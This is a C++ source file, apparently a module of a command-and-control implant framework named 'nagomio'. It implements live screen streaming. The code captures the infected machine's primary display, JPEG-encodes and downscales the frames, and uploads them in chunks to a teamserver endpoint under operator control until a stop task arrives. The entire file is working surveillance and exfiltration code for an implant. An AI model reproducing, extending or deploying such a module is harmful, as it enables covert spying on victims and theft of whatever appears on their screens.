// stream_display: live screen streaming.
//
// Captures the primary display at the requested FPS and posts frames in
// chunks to the teamserver's /api/upload/stream endpoint. Runs until the
// operator queues a `stream_stop` task (or until --max-duration-s is
// reached if specified).
//
// Args: [fps=10, jpeg_quality=70, frames_per_chunk=10, max_duration_s=0, scale_step=1]
//   * fps: target frames per second (1-30).
//   * scale_step: integer downscale factor (1=full, 2=half, 4=quarter).
//   * frames_per_chunk: how many frames per HTTP POST.
//   * max_duration_s: optional safety cap. 0 = run until stop.

#include "../json.hpp"
#include "../protocol.h"
#include "registry.h"
#include "stream_common.h"
#include "stream_state.h"

namespace nagomio_modules {

std::string handle_stream_display(const std::vector<std::string>& args) {
    clear_stream_stop();

    int fps        = nagomio_stream::parse_int_arg(args, 0, 10);
    int jpeg_quality = nagomio_stream::parse_int_arg(args, 1, 70);
    int frames_per_chunk = nagomio_stream::parse_int_arg(args, 2, 10);
    int max_duration_s = nagomio_stream::parse_int_arg(args, 3, 0);
    int scale_step = nagomio_stream::parse_int_arg(args, 4, 1);
    if (scale_step < 1)    scale_step = 1;
    if (scale_step > 4)    scale_step = 4;
    if (jpeg_quality < 1) jpeg_quality = 1;
    if (jpeg_quality > 100) jpeg_quality = 100;

    const std::string& agent_id = nagomio_current_agent_id();
    const std::string& task_id  = nagomio_current_task_id();

    auto frame_capture = [&](int /*frame_idx*/, int& out_w, int& out_h,
                              std::vector<unsigned char>& out_rgb) -> bool {
        int w = 0, h = 0;
        std::vector<unsigned char> rgb;
        if (!nagomio_stream::capture_display_frame(w, h, rgb)) return false;
        if (scale_step > 1) {
            nagomio_stream::scale_rgb24(rgb.data(), w, h, out_rgb, scale_step);
            out_w = w / scale_step;
            out_h = h / scale_step;
        } else {
            out_rgb = std::move(rgb);
            out_w = w;
            out_h = h;
        }
        return true;
    };

    auto stats = nagomio_stream::run_capture_loop(
        agent_id, task_id, std::move(frame_capture),
        fps, max_duration_s, frames_per_chunk, jpeg_quality);

    clear_stream_stop();

    nlohmann::json j = {
        {"type",         "stream_display"},
        {"fps",          fps},
        {"scale_step",   scale_step},
        {"quality",      jpeg_quality},
        {"frame_count",  stats.frame_count},
        {"chunk_count",  stats.chunk_count},
        {"width",        stats.width},
        {"height",       stats.height},
        {"total_bytes",  static_cast<uint64_t>(stats.total_bytes)},
        {"elapsed_ms",   static_cast<uint64_t>(stats.elapsed_ms)},
        {"stopped_by_flag", stats.stopped_by_flag},
    };
    if (!stats.last_error.empty()) j["warning"] = stats.last_error;
    return j.dump();
}

} // namespace nagomio_modules
